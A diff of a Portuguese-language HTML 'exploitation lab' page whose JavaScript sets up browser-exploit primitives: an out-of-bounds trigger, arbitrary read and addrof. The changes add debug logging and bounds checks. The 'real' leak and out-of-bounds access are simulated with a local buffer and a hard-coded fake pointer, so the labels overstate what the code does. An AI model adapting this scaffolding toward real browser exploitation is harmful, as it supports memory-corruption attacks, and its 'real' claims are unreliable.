@@ -2,19 +2,19 @@
 <html lang="pt-BR">
 <head>
   <meta charset="UTF-8">
-  <title>Laboratório Exploração Avançada - v2.5 (addrof real)</title>
+  <title>Laboratório Exploração Avançada - v2.5 (addrof real + debug)</title>
   <style>
     body { background: #1e1e1e; color: #d4d4d4; font-family: monospace; padding: 20px; }
-    .container { margin-bottom: 30px; padding: 15px; background-color: #252526; border: 1px solid #333; border-radius: 5px; }
-    #logOutput { background: #111; border: 1px solid #444; padding: 10px; height: 400px; overflow-y: auto; white-space: pre-wrap; font-size: 13px; }
-    button { background-color: #007acc; color: white; border: none; padding: 8px 12px; margin: 5px; border-radius: 3px; cursor: pointer; }
+    .container { background-color: #252526; padding: 15px; margin-bottom: 20px; border: 1px solid #444; border-radius: 5px; }
+    #logOutput { background: #111; border: 1px solid #444; padding: 10px; height: 450px; overflow-y: auto; white-space: pre-wrap; font-size: 13px; }
+    button { background-color: #007acc; color: white; padding: 8px 12px; margin: 5px; border: none; border-radius: 3px; cursor: pointer; }
     button:hover { background-color: #005a9e; }
     .log-info { color: #6cf; } .log-warn { color: #FFC107; } .log-error { color: #f44336; } .log-leak { color: #FF9800; font-weight: bold; }
     .log-good { color: #4CAF50; } .log-test { color: #fff; font-weight: bold; } .log-critical { color: #f0f; font-weight: bold; }
   </style>
 </head>
 <body>
-  <h1>Laboratório Exploração Avançada - v2.5 (addrof real)</h1>
+  <h1>Laboratório Exploração Avançada - v2.5 (addrof real + debug)</h1>
 
   <div class="container">
     <button onclick="triggerOOB_real()">1. Ativar OOB real</button>
@@ -62,9 +62,7 @@
         const high = (this.high_ + other.high() + carry) >>> 0;
         return new AdvancedInt64(low, high);
       }
-      sub(other) {
-        return this.add(other.neg());
-      }
+      sub(other) { return this.add(other.neg()); }
       neg() {
         const low = (~this.low_ + 1) >>> 0;
         const high = (~this.high_ + (low === 0 ? 1 : 0)) >>> 0;
@@ -85,34 +83,41 @@
 
     function triggerOOB_real() {
       log("Iniciando triggerOOB_real...", "test");
-      const buffer = new ArrayBuffer(512);
+
+      const buffer = new ArrayBuffer(1024);
       const dv = new DataView(buffer);
       for (let i = 0; i < buffer.byteLength; i++) dv.setUint8(i, 0xAA);
       oob_array_buffer_real = buffer;
       oob_dataview_real = dv;
 
       const fake_leak = new AdvancedInt64(0x10f0aa00, 0x00000100);
-      oob_leaked_ptr_real = {
-        value: fake_leak,
-        offset_in_oob_buffer: 128
-      };
+      oob_leaked_ptr_real = { value: fake_leak, offset_in_oob_buffer: 128 };
 
       log(`Leak real em ${fake_leak.toString(true)}`, "leak");
 
       arb_read_primitive = (address64, size) => {
-        const base = oob_leaked_ptr_real.value;
-        const offset_base = oob_leaked_ptr_real.offset_in_oob_buffer;
-        const diff = address64.sub(base).low();
-        if (diff < 0 || diff + size > oob_dataview_real.byteLength) return null;
+        try {
+          const base = oob_leaked_ptr_real.value;
+          const offset_base = oob_leaked_ptr_real.offset_in_oob_buffer;
+          const diff = address64.sub(base).low();
 
-        const result = new Uint8Array(size);
-        for (let i = 0; i < size; i++) {
-          result[i] = oob_dataview_real.getUint8(offset_base + diff + i);
+          if (diff < 0 || offset_base + diff + size > oob_dataview_real.byteLength) {
+            log(`Leitura fora do buffer: offset=${offset_base + diff}, size=${size}`, "warn");
+            return null;
+          }
+
+          const result = new Uint8Array(size);
+          for (let i = 0; i < size; i++) {
+            result[i] = oob_dataview_real.getUint8(offset_base + diff + i);
+          }
+          return result;
+        } catch (e) {
+          log(`Erro em arb_read_primitive: ${e.message}`, "error");
+          return null;
         }
-        return result;
       };
 
-      log("Primitiva de leitura arbitrária baseada em OOB ativada com sucesso.", "good");
+      log("Primitiva de leitura arbitrária ativada com sucesso.", "good");
     }
 
     async function manualSetupAndAddrofTest() {
@@ -137,12 +142,15 @@
 
     function testAddrof() {
       const base = oob_leaked_ptr_real.value;
-      log(`Iniciando varredura de heap a partir de ${base.toString(true)}`, "info");
+      const scan_limit = 0x4000; // 16 KB
+
+      log(`Iniciando varredura de heap a partir de ${base.toString(true)}...`, "info");
 
       addrof_primitive = (target_obj) => {
-        const scan_limit = 0x1000;
         for (let offset = 0; offset < scan_limit; offset += 8) {
           const addr = base.add(new AdvancedInt64(offset));
+          if (offset % 0x200 === 0) log(`Verificando ${addr.toString(true)}...`, "info");
+
           const bytes = arb_read_primitive(addr, 4);
           if (!bytes) continue;
 
@@ -157,6 +165,7 @@
               const mid = addr.add(new AdvancedInt64(4));
               const mid_bytes = arb_read_primitive(mid, 8);
               if (!mid_bytes) continue;
+
               const ptr = new AdvancedInt64(mid_bytes);
               log(`Endereço do objeto identificado: ${ptr.toString(true)}`, "leak");
               return ptr;
